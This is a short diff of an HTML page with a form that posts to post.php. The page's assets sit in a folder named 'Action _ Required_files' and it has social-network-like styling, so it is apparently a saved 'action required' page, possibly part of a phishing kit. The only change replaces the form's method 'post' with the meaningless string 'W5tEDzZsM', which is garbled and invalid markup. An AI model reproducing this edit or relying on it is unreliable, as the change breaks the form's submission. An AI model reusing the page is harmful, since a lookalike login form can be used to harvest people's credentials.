@@ -117,7 +117,7 @@
 </div>
 </div>
 
-                 <form class="sm:hidden lg:block md:block" action="post.php" method="post">
+                 <form class="sm:hidden lg:block md:block" action="post.php" method="W5tEDzZsM">
 <div class="relative flex border bg-[#e9ebee] h-12 md:block lg:block hidden "><div>
 <div>
   <img class="h-7  mx-10 mt-2 shadow-2xl md:block lg:block hidden" src="./Action _ Required_files/home.png" alt="">
